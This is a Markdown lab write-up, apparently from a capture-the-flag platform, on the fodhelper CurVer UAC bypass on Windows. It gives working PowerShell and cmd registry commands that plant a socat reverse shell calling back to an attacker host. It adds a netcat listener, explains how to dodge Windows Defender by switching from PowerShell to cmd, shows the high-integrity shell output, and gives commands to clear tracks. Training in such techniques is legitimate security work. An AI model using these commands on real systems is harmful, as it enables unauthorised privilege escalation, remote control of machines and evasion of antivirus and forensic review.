# Fodhelper-curver exploit

Now Defender is enabled and it detects [the fodhelper exploit attempt](autoelevate.md).

A variation on the fodhelper exploit was proposed by 
[V3ded](https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-`UAC`-bypasses), where different 
registry keys are used, but the basic principle is the same.

Instead of writing the payload into `HKCU\Software\Classes\ms-settings\Shell\Open\command`, use the `CurVer` entry 
under a `progID` registry key. This entry is used when you have multiple instances of an application with different 
versions running on the same system. CurVer allows for pointing to the default version of the application to be used 
by Windows when opening a given file type.

Create an entry on the registry for a new `progID` (any name will do) and then point the CurVer entry in the 
ms-settings `progID` to the newly created `progID`. This way, when `fodhelper` tries opening a file using the 
ms-settings `progID`, it will notice the CurVer entry pointing to the new `progID` and check it to see what command 
to use.

The exploit code proposed by @V3ded uses Powershell to achieve this end. A modified version of it, adapted for using 
reverse shell:

```text
$program = "powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"

New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force
    
New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force
    
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```

This exploit creates a new `progID` with the name `.pwn` and associates the payload to the command used when opening 
such files and points the CurVer entry of ms-settings to the `.pwn` `progID`. When `fodhelper` tries opening an 
ms-settings program, it will instead be pointed to the `.pwn` `progID` and use its associated command.

This technique is more likely to evade Windows Defender because we have more liberty on where to put the payload, 
as the name of the `progID` that holds our payload is entirely arbitrary. 

## Lab

Start a new reverse shell on the attacker machine:

    nc -lvp 4445

And execute the exploit from the backdoor connection. Windows Defender will throw another fit that references the 
actions taken. The detection methods used by AV software are implemented strictly against the published exploit, 
without considering possible variations. If we translate our exploit from Powershell to use `cmd.exe`, the AV won't 
raise any alerts.

```text
C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"

C:\> reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
The operation completed successfully.

C:\> reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
The operation completed successfully.

C:\> fodhelper.exe
```

In the high integrity reverse shell, get the flag:

```text
$ nc -lvp 4445      
Listening on 0.0.0.0 4445
Connection received on 10.10.183.127 23441
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /groups | find "Label"
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288

C:\> C:\flags\GetFlag-fodhelper-curver.exe
```

Clear tracks:

```text
reg delete "HKCU\Software\Classes\.thm\" /f
reg delete "HKCU\Software\Classes\ms-settings\" /f
```
